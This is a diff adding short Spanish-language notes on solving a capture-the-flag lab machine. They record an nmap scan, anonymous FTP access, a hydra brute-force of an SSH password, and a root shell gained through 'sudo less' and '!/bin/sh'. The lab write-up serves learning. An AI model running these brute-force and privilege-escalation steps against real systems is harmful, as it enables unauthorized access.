@@ -1,0 +1,64 @@
+notas maquina broklyng 99
+
+---------------------------
+
+ nmap -sC -sV 10.10.165.23
+
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.98.229
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
+|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
+|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+-------------------------
+gobuster
+
+gobuster dir -u http://10.10.165.23 -w /usr/share/wordlists/dirb/common.txt 
+
+
+----------------------------
+con ftp usamos Anonymous y descargamos el file note_to_jake
+	contenido: que le pedi a jake que cambiea su pass que era muy facil
+usamos un hydra para obtener su pass de ssh
+
+hydra -l jake -P /home/syrax/Documentos/rockyou.txt 10.10.165.23  -s 22 ssh  
+
+resultado:
+[22][ssh] host: 10.10.165.23   login: jake   password: 987654321
+
+----------------------------
+nos conectamos a ssh con este user y pass
+
+-----------------------------
+
+entramos al ssh descargamos el id_rsa y id_rsa.pub de jake encontramos q existen las carpetas de los usuarios amy y holt 
+en holt encontramos la flag user.txt
+usamos sudo -l y encontramos que podemos usar less --> buscamos en gtfobins 
+y como sabemos que puede user sudo en la tool less usamos 
+#	sudo less /etc/profile
+#	!/bin/sh
+
+lo cual nos deja como root y podemos ver la flag root para terminar la maquina
